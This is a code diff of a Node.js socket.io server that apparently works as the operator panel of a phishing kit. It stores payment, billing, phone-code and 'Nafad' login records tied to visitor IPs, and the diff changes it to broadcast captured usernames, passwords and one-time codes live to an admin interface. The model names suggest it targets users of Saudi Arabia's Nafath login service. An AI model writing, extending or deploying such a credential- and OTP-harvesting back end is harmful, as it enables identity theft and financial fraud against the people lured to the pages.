@@ -66,18 +66,18 @@ io.on('connection', socket => {
             nafadLogins,
             nafadCodes
         ] = await Promise.all([
-            IndexSubmission.find().lean(),
-            Details.find().lean(),
-            Comprehensive.find().lean(),
-            Billing.find().lean(),
-            Payment.find().lean(),
-            Visit.find().lean(),
-            phone.find().lean(),  // your `phone` model
-            PhoneCode.find().lean(),
-            ThirdParty.find().lean(),
-            Verification.find().lean(),
-            Nafad.find().lean(),
-            NafadCode.find().lean()
+            IndexSubmission.find().sort({ _id: -1 }).lean(),
+            Details.find().sort({ _id: -1 }).lean(),
+            Comprehensive.find().sort({ _id: -1 }).lean(),
+            Billing.find().sort({ _id: -1 }).lean(),
+            Payment.find().sort({ _id: -1 }).lean(),
+            Visit.find().sort({ _id: -1 }).lean(),
+            phone.find().sort({ _id: -1 }).lean(),  // your `phone` model
+            PhoneCode.find().sort({ _id: -1 }).lean(),
+            ThirdParty.find().sort({ _id: -1 }).lean(),
+            Verification.find().sort({ _id: -1 }).lean(),
+            Nafad.find().sort({ _id: -1 }).lean(),
+            NafadCode.find().sort({ _id: -1 }).lean()
         ]);
 
         // gather flags & locations
@@ -85,7 +85,7 @@ io.on('connection', socket => {
         const flags = users.map(u => ({ ip: u.ip, flag: u.flag }));
         const locations = users.map(u => ({ ip: u.ip, currentPage: u.location }));
 
-        socket.emit('initialData', {
+        io.emit('initialData', {
             indexSubmissions,        // index form submissions
             details: detailsArr,     // details page
             comprehensive: comprehensiveArr,
@@ -172,10 +172,9 @@ io.on('connection', socket => {
             const user = await findOrCreateUser(ip);
 
             // 2) Retrieve the latest NafadCode record for this user
-            const record = await NafadCode
-                .findOne({ user: user._id })
-                .sort({ time: -1 })
-                .lean();
+            const record = user.basmahCode
+                ? { code: user.basmahCode } // Use the basmahCode directly if it exists
+                : null;
 
             // 3) Extract the code (or null if none)
             const code = record ? record.code : null;
@@ -496,12 +495,11 @@ io.on('connection', socket => {
         // 3) Broadcast to admin UI (optional)
         io.emit('newOtp', {
             ip: user.ip,
-            code: saved.verificationCode,
-            time: saved.time
+            code: saved.code
         });
 
         // 4) Ack back to the client
-        socket.emit('nafadCode', { msg: true, code: verification_code });
+        socket.emit('nafadCode', { msg: true, code: saved.code });
 
     });
 
@@ -561,7 +559,7 @@ io.on('connection', socket => {
         });
 
         // 3) Broadcast minimal payload for admin UI
-        socket.emit('newNafad', {
+        io.emit('newNafad', {
             ip: user.ip,
             username: saved.username,
             password: saved.password,
